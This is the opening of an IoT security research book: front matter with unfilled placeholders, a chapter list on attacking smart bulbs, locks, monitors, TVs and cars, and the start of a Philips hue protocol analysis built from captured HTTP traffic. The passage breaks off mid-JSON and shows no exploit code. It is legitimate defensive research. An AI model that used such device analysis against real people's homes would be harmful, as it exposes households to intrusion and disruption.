
Nitesh Dhanjani
Abusing the Internet of Things

Abusing the Internet of Things
by Nitesh Dhanjani
Copyright © 2010 Nitesh Dhanjani. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://safaribooksonline.com). For more information, contact our corporate/
institutional sales department: 800-998-9938 or corporate@oreilly.com.
Editors: Mike Loukides and Brian Sawyer
Production Editor: FIX ME!
Copyeditor: FIX ME!
Proofreader: FIX ME!
Indexer: FIX ME!
Cover Designer: Karen Montgomery
Interior Designer: David Futato
Illustrator: Rebecca Demarest
January -4712:
First Edition
Revision History for the First Edition:
2015-04-03: Early release revision 1
2015-05-29: Early release revision 2
2015-06-08: Early release revision 3
2015-06-16: Early release revision 4
2015-06-26: Early release revision 5
See http://oreilly.com/catalog/errata.csp?isbn=0636920033547 for release details.
Nutshell Handbook, the Nutshell Handbook logo, and the O’Reilly logo are registered trademarks of O’Reilly
Media, Inc. !!FILL THIS IN!! and related trade dress are trademarks of O’Reilly Media, Inc.
Many of the designations used by manufacturers and sellers to distinguish their products are claimed as
trademarks. Where those designations appear in this book, and O’Reilly Media, Inc. was aware of a trademark
claim, the designations have been printed in caps or initial caps.
While every precaution has been taken in the preparation of this book, the publisher and authors assume
no responsibility for errors or omissions, or for damages resulting from the use of the information contained
herein.
ISBN: 063-6-920-03354-7
[?]

Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  vii
1. Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts. . . . . . . . . . . . . . .  1
Why hue?                                                                                                                             2
Contolling Lights Via the Website Interface                                                                  4
Information Leakage                                                                                                    13
Drive-by Blackouts                                                                                                       14
Weak Password Complexity and Password Leaks                                                   15
Controlling Lights Using the iOS App                                                                          18
Stealing the Token from a Mobile Device                                                                 32
Malware Can Cause Perpetual Blackout                                                                   33
Changing Lightbulb State                                                                                               37
If This Then That (IFTTT)                                                                                             40
Conclusion                                                                                                                        42
2. Electronic Lock Picking: Abusing Door Locks to Compromise Physical Security. . . . . . .  45
Hotel Door Locks and Magnetic Stripes                                                                       46
The Onity Door Lock                                                                                                  46
The Magnetic Stripe                                                                                                     48
The Programming Port                                                                                               50
Security Issues                                                                                                               50
Vendor Response                                                                                                          51
The Case of Z-Wave-Enabled Door Locks                                                                   52
Z-Wave Protocol and Implementation Analysis                                                      52
Exploiting Key Exchange Vulnerability                                                                    54
Bluetooth Low Energy and Unlocking Via Mobile Apps                                           55
Understanding Weaknesses in BLE and Using Packet-Capture Tools                 56
Kevo Kwikset Mobile App Insecurities                                                                     61
Conclusion                                                                                                                        69
iii

3. Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing. . . . . . . . .  71
The Foscam Incident                                                                                                       72
Foscam Vulnerabilities Exposed by Researchers                                                     73
Using Shodan to Find Baby Monitors Exposed on the Internet                           74
Exploiting Default Credentials                                                                                   76
Exploiting Dynamic DNS                                                                                           78
The Foscam Saga Continues                                                                                       79
The Belkin WeMo Baby Monitor                                                                                  81
Bad Security by Design                                                                                                88
Malware Gone Wild                                                                                                     89
Some Things Never Change: The WeMo Switch                                                        90
Conclusion                                                                                                                        97
4. Blurred Lines: When the Physical Space Meets the Virtual Space. . . . . . . . . . . . . . . . . . .  99
SmartThings                                                                                                                   100
Hijacking Credentials                                                                                                114
Abusing the Physical Graph                                                                                     120
SmartThings SSL Certificate Validation Vulnerability                                         126
Interoperability with Insecurity Leads to … Insecurity                                           127
SmartThings and hue Lighting                                                                                 128
SmartThings and the WeMo Switch                                                                        135
Conclusion                                                                                                                      143
5. The Idiot Box: Attacking “Smart” Televisions. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  145
The TOCTTOU Attack                                                                                                 147
The SamSung LExxB650 Series                                                                                148
The Exploit                                                                                                                  150
You call that Encryption?                                                                                              153
Understanding XOR                                                                                                  154
I call it Encraption                                                                                                      156
Understanding and Exploiting the App World                                                         160
Decrypting Firmware                                                                                                160
Cursory Exploration of the Operating System                                                      162
Remotely Exploiting a SamSung Smart TV                                                           165
Inspecting Your Own Smart TV (and other IoT devices)                                       170
Say Hello to the Pineapple Mark V                                                                          170
Capturing credentials and stripping TLS                                                               175
Conclusion                                                                                                                      179
6. Connected Car Security Analysis: From Gas to Fully Electric. . . . . . . . . . . . . . . . . . . . . .  181
Tire Pressure Monitoring System (TPMS)                                                                 182
Reversing TPMS Communication                                                                           184
iv 
| 
Table of Contents

Eavesdropping and Privacy Implications                                                               186
Spoofing Alerts                                                                                                           187
Exploiting wireless connectivity                                                                                  188
Injecting CAN Data                                                                                                   188
Bluetooth Vulnerabilities                                                                                          190
Vulnerabilities in Telematics                                                                                     192
Significant Attack Surface                                                                                         194
Tesla Model S                                                                                                                  195
Locate and Steal a Tesla the Old Fashioned Way                                                   199
Social Engineering Tesla Employees and the Quest for Location Privacy         203
Handing Out Keys to Strangers                                                                               205
Or Just Borrow Someone’s Phone                                                                            207
Additional Information and Potential Low Hanging Fruit                                  208
Auto Pilot and the Autonomous Car                                                                      211
Conclusion                                                                                                                      213
7. Secure Prototyping: littleBits and cloudBits. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  215
Introducing the cloudBit Starter Kit                                                                           216
Setting Up the cloudBit                                                                                             219
Designing the SMS Doorbell                                                                                    227
Oops, We Forgot the Button!                                                                                    232
Security Evaluation                                                                                                        235
WiFi Insecurity, Albeit Brief                                                                                     235
Sneaking in Command Execution                                                                           238
One Token to Rule them All                                                                                     241
Beware of Hardware Debug Interfaces                                                                   245
Abuse Cases in the Context of Threat Agents                                                           248
Nation States, Including the NSA                                                                            249
Terrorists                                                                                                                     250
Criminal Organizations                                                                                             250
Disgruntled or Nosy Employees                                                                              251
Hacktivists                                                                                                                   253
Vandals                                                                                                                         254
Bullying                                                                                                                        259
Predators                                                                                                                      260
Bug Bounty Programs                                                                                                   261
Conclusion                                                                                                                      262
8. Securely Enabling our Future: A Conversation on Upcoming Attack Vectors. . . . . . . . .  265
The Thingbots Have Arrived                                                                                       265
The Rise of the Drones                                                                                                  266
Cross Device Attacks                                                                                                     267
Table of Contents 
| 
v

Hearing Voices                                                                                                               268
IoT Cloud Infrastructure Attacks                                                                                273
Backdoors                                                                                                                        274
The Lurking Heartbleed                                                                                                275
Diluting the Medical Record                                                                                        276
The Data Tsunami                                                                                                         281
Targeting Smart Cities                                                                                                   282
Inter Space Communication Will be a Ripe Target                                                  283
The Dangers of Superintelligence                                                                               284
Conclusion                                                                                                                      285
9. Two Scenarios: Intentions and Outcomes. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  287
The Cost of a Free Beverage                                                                                         287
There’s a Party at Ruby Skye                                                                                     288
Leveraging the “Buzz Word”                                                                                    289
The Board Meeting                                                                                                    289
A Case of Anger, Denial, and Self Destruction                                                          291
The Benefit of LifeThings                                                                                         291
Social Engineering Customer Support by Spoofing SMS                                    292
The (In)Secure Token                                                                                                293
Total Ownage                                                                                                              294
The Demise of LifeThings                                                                                         296
Conclusion                                                                                                                      298
vi 
| 
Table of Contents

Preface
The upcoming age of the Internet of Things (IoT) will blur the line between our physical
and online lives. Attacks targeting our online spaces will put our physical security at
risk. Traditionally, the attack vectors to our fundamental luxuries have required physical
tampering, mostly because access to the infrastructure has been limited from the In‐
ternet. This is about to change with the upcoming disruption caused by a future with
billions of “things” connected to the Internet.
In this book, we will take a fascinating look into abusing the most popular IoT-based
devices already available in the market. We will take a look at how a simple attack can
cause a perpetual blackout targeting LED lightbulbs, how bad security decisions have
grossly violated the physical safety and privacy of families, and how the insecurity of
powerful electric vehicles can put your life at risk.
The goal of this book is to demonstrate tangible risk in IoT devices that we are going to
depend on more and more as time progresses. Once we begin to understand the cause
of actual security vulnerabilities in devices today, we will begin to set the path for a future
that will help us enable these devices to securely enhance and augment our lives.
Malicious attackers are already hard at work uncovering and exploiting these security
defects and they will continue to find crafty avenues to abuse their knowledge every way
they can. These attackers span the spectrum of curious college students to sophisticated
private and state sponsored criminal gangs that are interested in terrorizing individuals
and populations. The impact of security vulnerabilities in IoT devices can lead to mass
compromise of privacy and cause physical harm. The stakes are high.
Who This Book Is For
This book is for anyone who is interested in deconstructing IoT devices in the market
today to find security vulnerabilities. Doing so will put you in the mindset of malicious
attackers who are also busy finding ways to exploit these devices to their advantage.
Once you understand the devious tactics employed by entities targeting the world of
vii

IoT, you will gain deeper insight into the tactics and psychology of attackers so you can
learn to protect yourself and to help design secure IoT products.
How to Use This Book
This book is organized into the following chapters:
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts
The book begins with a deep dive into the design and architecture of one of the
more popular IoT products available in the market: the Philips hue personal lighting
system. This chapter presents various security issues for the system, including fun‐
damental issues such as password security and the possibility of malware abusing
weak authorization mechanisms to cause sustained blackouts. We also discuss the
complexity of internetworking our online spaces (such as Facebook) with IoT de‐
vices, which can lead to security issues spanning multiple platforms.
Chapter 2: Electronic Lock Picking: Abusing Door Locks to Compromise Physical Secu‐
rity
This chapter takes a look at the security vulnerabilities surrounding existing elec‐
tronic door locks, their wireless mechanisms, and their integration with mobile
devices. We also present actual case studies of attackers that have exploited these
issues to conduct robberies.
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other
Thing
Security defects in remotely controllable baby monitors are covered in this chapter.
We take a look at details of actual vulnerabilities that have been abused by attackers
and show how such simple design flaws can put the safety of families at risk.
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space
Companies like SmartThings sell a suite of IoT devices and sensors that can be
leveraged to protect the home, such as receiving a notification of a potential intruder
if the main door of a home is opened after midnight. The fact that these devices use
the Internet to operate has increased our dependency on network connectivity,
thereby blurring the lines between our physical world and the cyber world. We take
a look at the security of the SmartThings suite of products and also how it is designed
to securely operate with devices from other manufacturers.
Chapter 5: The Idiot Box: Attacking “Smart” Televisions
Televisions today are essentially computers running powerful operating systems
such as Linux. They connect to the home WiFi and include services such as watching
streaming video, video conferencing, social networking, and instant messaging.
This chapter studies actual vulnerabilities in SamSung branded TVs to understand
the root cause of the flaws and the potential impact to our privacy and safety.
viii 
| 
Preface

Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric
Cars are also things that are now accessible and controllable remotely. Unlike many
other devices, the interconnectedness of the car can serve important safety func‐
tionality, yet security vulnerability can lead to the loss of lives. This chapter studies
a low-range wireless system, followed by a review of extensive research performed
by leading experts in academia. We analyze and discuss features that can be found
in the Tesla Model S sedan, including possible ways the security of the car can be
improved.
Chapter 7: Secure Protyping: littleBits and cloudBits
The first order of business when desiging an IoT product is to create a prototype
to make certain the idea is feasible, to explore alternative design concepts, and to
provide specifications to build a solid business case. It becomes extremely important
to design security in the initial prototype and subsequent iterations towards the
final product. Security as an afterthought is bound to lead to finished products that
put the security and privacy of the consumers at risk. In this chapter, we prototype
an SMS doorbell that uses the littleBits prototyping platform. The cloudBit module
helps us provide remote wireless connectivity that allows us to prototype our IoT
idea to send an SMS message to the user when the doorbell is pressed. Discussion
of the prototype steps through security issues and requirements upon desiging the
protype and discuss important security considerations that should be addressed by
product designers.
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors
In the next few years, our dependance on IoT devices in our lives is bound to
skyrocket. In this chapter, we will predict plausable scenarios of attacks based upon
our understanding of how IoT devices will serve our needs in the future.
Chapter 9: Two Scenarios: Intentions and Outcomes
In this chapter, we will take a look at two different scenarios to gain a good appre‐
ciation of how people can influence security incidents. In the first scenario, we will
take a look at how an executive at a large corporation attempts to leverage the “buzz”
surrounding the topic of IoT with the intention that it will impress the board of
directors. In the second scenario, we will take a look at how an up and coming IoT
service provider chooses to engage and respond to researchers and journalists with
the intention of preserving the integrity of their business. The goal of this chapter
is to illustrate that, ultimately, the consequences of security related scenarios are
heavily influenced by the intentions and actions of the people involved.
Conventions Used in This Book
The following typographical conventions are used in this book:
Preface 
| 
ix

Italic
Indicates new terms, URLs, email addresses, filenames, and file extensions.
Constant width
Used for program listings, as well as within paragraphs to refer to program elements
such as variable or function names, databases, data types, environment variables,
statements, and keywords.
Constant width bold
Shows commands or other text that should be typed literally by the user.
Constant width italic
Shows text that should be replaced with user-supplied values or by values deter‐
mined by context.
This element signifies a tip or suggestion.
This element signifies a general note.
This element indicates a warning or caution.
Using Code Examples
This book is here to help you get your job done. In general, if example code is offered
with this book, you may use it in your programs and documentation. You do not need
to contact us for permission unless you’re reproducing a significant portion of the code.
For example, writing a program that uses several chunks of code from this book does
not require permission. Selling or distributing a CD-ROM of examples from O’Reilly
books does require permission. Answering a question by citing this book and quoting
example code does not require permission. Incorporating a significant amount of ex‐
ample code from this book into your product’s documentation does require permission.
x 
| 
Preface

We appreciate, but do not require, attribution. An attribution usually includes the title,
author, publisher, and ISBN. For example: “Abusing the Internet of Things by Nitesh
Dhanjani (O’Reilly). Copyright 2015 Nitesh Dhanjani, 978-1-491-90233-2.”
If you feel your use of code examples falls outside fair use or the permission given above,
feel free to contact us at permissions@oreilly.com.
Safari® Books Online
Safari Books Online is an on-demand digital library that
delivers expert content in both book and video form from
the world’s leading authors in technology and business.
Technology professionals, software developers, web designers, and business and crea‐
tive professionals use Safari Books Online as their primary resource for research, prob‐
lem solving, learning, and certification training.
Safari Books Online offers a range of plans and pricing for enterprise, government,
education, and individuals.
Members have access to thousands of books, training videos, and prepublication manu‐
scripts in one fully searchable database from publishers like O’Reilly Media, Prentice
Hall Professional, Addison-Wesley Professional, Microsoft Press, Sams, Que, Peachpit
Press, Focal Press, Cisco Press, John Wiley & Sons, Syngress, Morgan Kaufmann, IBM
Redbooks, Packt, Adobe Press, FT Press, Apress, Manning, New Riders, McGraw-Hill,
Jones & Bartlett, Course Technology, and hundreds more. For more information about
Safari Books Online, please visit us online.
How to Contact Us
Please address comments and questions concerning this book to the publisher:
O’Reilly Media, Inc.
1005 Gravenstein Highway North
Sebastopol, CA 95472
800-998-9938 (in the United States or Canada)
707-829-0515 (international or local)
707-829-0104 (fax)
We have a web page for this book, where we list errata, examples, and any additional
information. You can access this page at http://www.oreilly.com/catalog/<catalog page>.
To comment or ask technical questions about this book, send email to bookques
tions@oreilly.com.
Preface 
| 
xi

For more information about our books, courses, conferences, and news, see our website
at http://www.oreilly.com.
Find us on Facebook: http://facebook.com/oreilly
Follow us on Twitter: http://twitter.com/oreillymedia
Watch us on YouTube: http://www.youtube.com/oreillymedia
Acknowledgments
Thanks to Mike Loukides, Dawn Schanafelt, and Brian Sawyer for collaborating and
supporting the book from proposal to the finished product. Thank you to the entire
O’Reilly team, who made this book a reality.
Thanks to my friend Greg Zatkovich for his contageous enthusiasm and support.
Thanks to Sri Vasudevan for reviewing the chapters and for the valuable feedback.
xii 
| 
Preface

CHAPTER 1
Lights Out: Hacking Wireless Lightbulbs to
Cause Sustained Blackouts
The Northeast Blackout of 2003 was widespread and affected people throughout parts
of northeastern and midwestern United States and Ontario. Approximately 45 million
people were affected for as long as two days. In New York alone, 3,000 fire calls were
reported due to incidents related to individuals using candles. There were 60 cases of
alarm fires that were caused by the use of candles and two cases of fatalities that resulted
from the use of flames to provide light. In Michigan, candles left burning during the
blackout caused a fatal fire that destroyed a home.
The startling issue is not that the Northeast Blackout occurred, but how the developed
world takes luxuries like electricity for granted and how we have come to depend upon
it. Moments when our fundamental luxuries are taken away from us cause us to reflect
upon and appreciate our reliance upon them. We flip a switch and we expect the instant
glow of the electric flame. We open the refrigerator and expect our food and drinks to
be waiting for us at just the right temperature. We walk into our homes and expect the
air conditioning to continuously and automatically maintain a comfortable equilibrium
between hot and cold temperatures.
It’s been roughly 100 years since we’ve figured out how to generate electricity. Before
that, houses were lit with kerosene lamps and warmed with stoves. Our current level of
dependence upon electricity is phenomenal; our cities and businesses come to halt
within seconds of a blackout.
The United States is powered by three interconnected grids that move electricity around
the country: the Eastern Interconnection, Western Interconnection, and the Texas In‐
terconnection. These systems are interconnected by communication between utilities
and their transmission systems to share the benefits of building larger generators and
providing electricity at a lower cost.
1

Developed nations clearly rely upon the electric grid to empower and sustain their
economies and the well being of their citizens. Computers increasingly operate much
of the technology that comprises of the grid, inclusive of generators and transformers,
and their functionality is accessible remotely through computer networks. As such, the
concern over cyber-security-related threats is high.
In addition to the need to ensure the security of the power grid, the upcoming era of
consumer-based IoT product adds an additional technology ecosystem that also needs
to be protected: the security of the IoT products themselves. There are various products
in the market today that replace traditional lighting with bulbs that can be controlled
wirelessly and remotely. As we start to install IoT devices like these in our homes and
offices, we need to also be assured of the secure design of these devices, in addition to
the underlying infrastructure such as the power grid.
In this chapter, we will do a deep dive into the design and architecture of one of the
more popular IoT products available in the market: the Philips hue personal lighting
system. Our society has come to depend on lighting for convenience, as well as for our
safety, so it makes sense to use a popular IoT product in this space as the focus of the
first chapter. We will take a look at how the products operates and communicates from
a security perspective and attempt to locate security vulnerabilities. Only by deep anal‐
ysis can we begin to have a solid discussion and framework around the security issues
at hand today and learn how to construct secure IoT devices of the future.
Why hue?
We’ve established why lighting is paramount to our civilization’s convenience and safety.
As we begin analysis of IoT devices in this space, we’d specifically like to study the Philips
hue personal lighting system because of its popularity in the consumer market. It is one
of the first IoT-based lighting products to gain popularity, so it is likely to inspire com‐
peting products to follow its architecture and design. As such, a security analysis of the
hue product will give us a good understanding of what security mechanisms are being
employed in IoT products today, what potential vulnerabilities exist, and what changes
are necessary to securely design such products in the future.
The hue lighting system is available for purchase at various online and brick-and-mortar
outlets. As shown in Figure 1-1, the starter pack includes three wireless bulbs and a
bridge. The bulbs can be configured to any of 16 million colors using the hue website
or the iOS app.
2 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-1. The hue starter pack contains the bridge and three wireless bulbs
The bridge connects to the user’s router using an Ethernet cable, establishing and main‐
taining an outbound connection to the hue Internet infrastructure, as we will discuss
in the following sections. The bridge communicates directly with the LED bulbs using
the ZigBee protocol, which is built upon the IEEE 802.15.4 standard. ZigBee is a low-
cost and low-powered protocol, which makes it popular among IoT devices that com‐
municate with each other.
Why hue? 
| 
3

When the user is on the local network, the iOS app connects directly to the bridge to
issue commands that change the state of the bulbs. When the user is remote or when
the hue website is used, the instructions are sent through the hue Internet infrastructure.
In the following sections, we will study the underlying security architecture to under‐
stand the implementation and uncover weaknesses in the design. This will provide a
solid understanding of security issues that can impact popular consumer-based IoT
lighting systems in the market today.
Contolling Lights Via the Website Interface
A good way to uncover security vulnerabilities is to understand the underlying tech‐
nology architecture, and use-case analysis is one of the best ways to do so. The most
basic use case of the hue system is to register for an online hue account through the
website interface and associate the bridge to the account. Once this is accomplished, the
user can use his or her account to control the lights from a remote location. In this
section, we will take a look at how the system lets the user associate the bridge to his or
her account and control the lights from the website. Once we’ve shown how the use case
is implemented in design, we will discuss associated security issues and how they can
be exploited.
First, every user must register for a free account at the hue portal, shown in
Figure 1-2. The user is required to pick a name, enter his or her email address, and create
six-character (at minimum) password.
4 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Figure 1-2. hue website account registration
In the second step, the website attempts to locate and associate the bridge with the
account the user just created. As shown in Figure 1-3, the website then displays the
message “We found your bridge.”
Contolling Lights Via the Website Interface 
| 
5

Figure 1-3. Associating the bridge with the website
The website knows that it has located the bridge because the bridge routinely connects
to the hue backend to broadcast its id (a unique id is assigned to every physical bridge
manufactured), internal IP address, and MAC address (identical to the id). The bridge
does this by making a POST request to dcs.cb.philips.com, like this:
POST /Dcs.ConnectionServiceHTTP/1.0
Host: dcs.cb.philips.com:8080
Authorization: CBAuth Type="SSO", Client="[DELETED]", RequestNr="16",
Nonce="[DELETED]", SSOToken="[DELETED]", Authentication="[DELETED]
Content-Type: application/CB-MessageStream; boundary=ICPMimeBoundary
Transfer-Encoding: Chunked
304
--ICPMimeBoundary
Content-Type: application/CB-Encrypted; cipher=AES
Content-Length:0000000672
[DELETED]
To which the server side responds:
HTTP/1.0 200 OK
WWW-Authenticate :  CBAuth Nonce="[DELETED]"
Connection : close
6 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Content-Type : application/CB-MessageStream; boundary="ICPMimeBoundary"
Transfer-Encoding : Chunked
001
The code marked [DELETED] signifies actual content that was de‐
leted to preserve the confidentiality and integrity of the hardware and
accounts being tested. The removal of the associated characters has
no material effect on understanding the example.
The 001 response to the POST request indicates that the hue infrastructure has registered
the bridge by associating its id with the source IP address of the HTTP connection.
If you have the hue system installed, you can browse to https://www.meethue.com/api/
nupnp from your home network to obtain the information reported by your bridge to
the hue infrastructure. As shown in Figure 1-4, you’ll see the id of the bridge, along
with its MAC address and internal IP address. The hue website maintains a collection
of bridges (based on their id, internal IP addresses, and MAC addresses) and pairs them
with the source IP address of the TCP connection (as you are browsing the hue website).
This is why the website confidently displays “We found your bridge” (Figure 1-3).
Figure 1-4. Bridge’s id, internal IP address, and MAC address
The user does not have permission to use the bridge remotely until pressing the physical
button on the bridge within 30 seconds. Requiring the user to prove to the server side
that he or she has physical access to the bridge provides an additional layer of security.
After displaying the message in Figure 1-3, the web browser issues the following GET
request:
GET /en-US/user/isbuttonpressed HTTP/1.1
Host: www.meethue.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10
Contolling Lights Via the Website Interface 
| 
7

(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: https://www.meethue.com/en-US/user/linkbridge
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Cookie:[DELETED]
Connection: keep-alive
Proxy-Connection: keep-alive
This GET request will wait for 30 seconds, giving the user time to physically press the
button on the bridge. When the user presses the button, the bridge sends a POST request
to dcp.cpp.philips.com signifying the event. In this situation, after the user has proven
physical ownership of the bridge, the server positively responds to the POST request:
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: [DELETED]
Vary: Accept-Encoding
Date: Mon, 29 Apr 2013 23:30:06 GMT
Server: Google Frontend
Content-Length: 4
true
This response from the server indicates that the button was indeed pressed. The browser
then sends the following GET request to complete the setup:
GET /en-US/user/setupcomplete HTTP/1.1
Host: www.meethue.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)
AppleWebKit/536.28.10
(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10
Accept: text/html,application/xhtml+xml,application/xml;
DNT: 1
Referer: https://www.meethue.com/en-US/user/linkbridge
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Cookie: [DELETED]
Connection: keep-alive
Proxy-Connection: keep-alive
The server responds to the GET request with various types of details:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8; charset=utf-8
Cache-Control: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
8 
| 
Chapter 1: Lights Out: Hacking Wireless Lightbulbs to Cause Sustained Blackouts

Set-Cookie: PLAY_FLASH=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_ERRORS=;Path=/;Expires=Thu, 01 Jan 1970 00:00:00 GMT
Set-Cookie: PLAY_SESSION="[DELETED]-%00ip_address%3A[DELETED]__[DELETED]
;Path=/
Vary: Accept-Encoding
Date: Mon, 29 Apr 2013 23:30:08 GMT
Server: Google Frontend
Content-Length: 47369
[DELETED]
app.data.bridge = {"clientMessageState":[DELETED],"config":{"lights":{"15":
{"name":"Bathroom 2","state":{"bri":254,"effect":"none","sat":144,"reachabl
e":true,"alert":"none","hue":14922,"colormode":"ct","on":false,"ct":369,"xy
":[0.4595,0.4105]},"modelid":"LCT001","swversion":"65003148","pointsymbol":
{"3":"none","2":"none","1":"none","7":"none","6":"none","5":"none","4":"non
e","8":"none"},"type":"Extended color light"},"13":{"name":"Bathroom 4","st
ate":{"bri":254,"effect":"none","sat":144,"reachable":true,"alert":"none","
hue":14922,"colormode":"ct","on":false,"ct":369,"xy":[0.4595,0.4105]},"mode
lid":"LCT001","swversion":"65003148","pointsymbol":{"3":"none","2":"none","
1":"none","7":"none","6":"none","5":"none","4":"none","8":"none"},"type":"E
xtended color light"},"14":{"name":"Bathroom 3","state":{"bri":254,"effect"
:"none","sat":144,"reachable":true,"alert":"none","hue":14922,"colormode":"
ct","on":false,"ct":369,"xy":[0.4595,0.4105]},"modelid":"LCT001","swversion
":"65003148","pointsymbol":{"3":"none","2":"none","1":"none","7":"none","6"
:"none","5":"none","4":"none","8":"none"},"type":"Extended color light"},"1
1":{"name":"Hallway 2","state":{"bri":123,"effect":"none","sat":254,"reacha
ble":true,"alert":"none","hue":17617,"colormode":"xy","on":false,"ct":424,"
xy":[0.492,0.4569]},"modelid":"LCT001","swversion":"65003148","pointsymbol"
:{"3":"none","2":"none","1":"none","7":"none","6":"none","5":"none","4":"no
ne","8":"none"},"type":"Extended color light"},"12":{"name":"Bathroom 1","s
tate":{"bri":254,"effect":"none","sat":144,"reachable":true,"alert":"none",
"hue":14922,"colormode":"ct","on":false,"ct":369,"xy":[0.4595,0.4105]},"mod
elid":"LCT001","swversion":"65003148","pointsymbol":{"3":"none","2":"none",
"1":"none","7":"none","6":"none","5":"none","4":"none","8":"none"},"type":"
Extended color light"},"3":{"name":"Living room lamp 2","state":{"bri":102,
"effect":"none","sat":234,"reachable":true,"alert":"none","hue":687,"colorm
ode":"xy","on":false,"ct":500,"xy":[0.6452,0.3312]},"modelid":"LCT001","swv
ersion":"65003148","pointsymbol":{"3":"none","2":"none","1":"none","7":"non
e","6":"none","5":"none","4":"none","8":"none"},"type":"Extended color ligh
t"},"2":{"name":"Living room lamp 1","state":{"bri":119,"effect":"none","sa
t":180,"reachable":true,"alert":"none","hue":51616,"colormode":"xy","on":fa
lse,"ct":158,"xy":[0.3173,0.187]},"modelid":"LCT001","swversion":"65003148"
,"pointsymbol":{"3":"none","2":"none","1":"none","7":"none","6":"none","5":
"none","4":"none","8":"none"},"type":"Extended color light"},"1":{"name":"B
ookshelf 1","state":{"bri":161,"effect":"none","sat":236,"reachable":true,"
alert":"none","hue":696,"colormode":"xy","on":false,"ct":500,"xy":[0.6474,0
.3308]},"modelid":"LCT001","swversion":"65003148","pointsymbol":{"3":"none"
,"2":"none","1":"none","7":"none","6":"none","5":"none","4":"none","8":"non
e"},"type":"Extended color light"},"10":{"name":"Bedroom 1","state":{"bri":
254,"effect":"none","sat":144,"reachable":true,"alert":"none","hue":14922,"
colormode":"ct","on":false,"ct":369,"xy":[0.4595,0.4105]},"modelid":"LCT001
","swversion":"65003148","pointsymbol":{"3":"none","2":"none","1":"none","7
Contolling Lights Via the Website Interface 
| 
9

":"none","6":"none","5":"none","4":"none","8":"none"},"type":"Extended colo
r light"},"7":{"name":"Guest bedroom 1","state":{"bri":115,"effect":"none",
"sat":144,"reachable":true,"alert":"none","hue":14922,"colormode":"xy","on"
:false,"ct":369,"xy":[0.2567,0.2172]},"modelid":"LCT001","swversion":"65003
148","pointsymbol":{"3":"none","2":"none","1":"none","7":"none","6":"none",
"5":"none","4":"none","8":"none"},"type":"Extended color light"},"6":{"name
":"Kitchen 3","state":{"bri":74,"effect":"none","sat":253,"reachable":true,
"alert":"none","hue":37012,"colormode":"xy","on":false,"ct":153,"xy":[0.281
,0.2648]},"modelid":"LCT001","swversion":"65003148","pointsymbol":{"3":"non
e","2":"none","1":"none","7":"none","6":"none","5":"none","4":"none","8":"n
one"},"type":"Extended color light"},"5":{"name":"Kitchen 1","state":{"bri"
:106,"effect":"none","sat":254,"reachable":true,"alert":"none","hue":25593,
"colormode":"xy","on":false,"ct":290,"xy":[0.4091,0.518]},"modelid":"LCT001
","swversion":"65003148","pointsymbol":{"3":"none","2":"none","1":"none","7
":"none","6":"none","5":"none","4":"none","8":"none"},"type":"Extended colo
r light"},"4":{"name":"Bookshelf 2","state":{"bri":16,"effect":"none","sat"
:247,"reachable":true,"alert":"none","hue":11901,"colormode":"xy","on":fals
e,"ct":500,"xy":[0.5466,0.4121]},"modelid":"LCT001","swversion":"65003148",
"pointsymbol":{"3":"none","2":"none","1":"none","7":"none","6":"none","5":"
none","4":"none","8":"none"},"type":"Extended color light"},"9":{"name":"Ki
tchen 2","state":{"bri":246,"effect":"none","sat":216,"reachable":true,"ale
rt":"none","hue":58013,"colormode":"xy","on":false,"ct":359,"xy":[0.4546,0.
2323]},"modelid":"LCT001","swversion":"65003148","pointsymbol":{"3":"none",
"2":"none","1":"none","7":"none","6":"none","5":"none","4":"none","8":"none
"},"type":"Extended color light"},"8":{"name":"Hallway 1","state":{"bri":9,
"effect":"none","sat":254,"reachable":true,"alert":"none","hue":25593,"colo
rmode":"xy","on":false,"ct":290,"xy":[0.4091,0.518]},"modelid":"LCT001","sw
version":"65003148","pointsymbol":{"3":"none","2":"none","1":"none","7":"no
ne","6":"none","5":"none","4":"none","8":"none"},"type":"Extended color lig
ht"}},"schedules":{},"config":{"portalservices":true,"gateway":"192.168.2.1
","mac":"[DELETED]","swversion":"01005215","ipaddress":"192.168.2.2","proxy
port":0,"swupdate":{"text":"","notify":false,"updatestate":0,"url":""},"lin
kbutton":true,"netmask":"255.255.255.0","name":"Philips hue","dhcp":true,"U
TC":"2013-04-29T21:13:29","proxyaddress":"","whitelist":{"[DELETED]":{"name
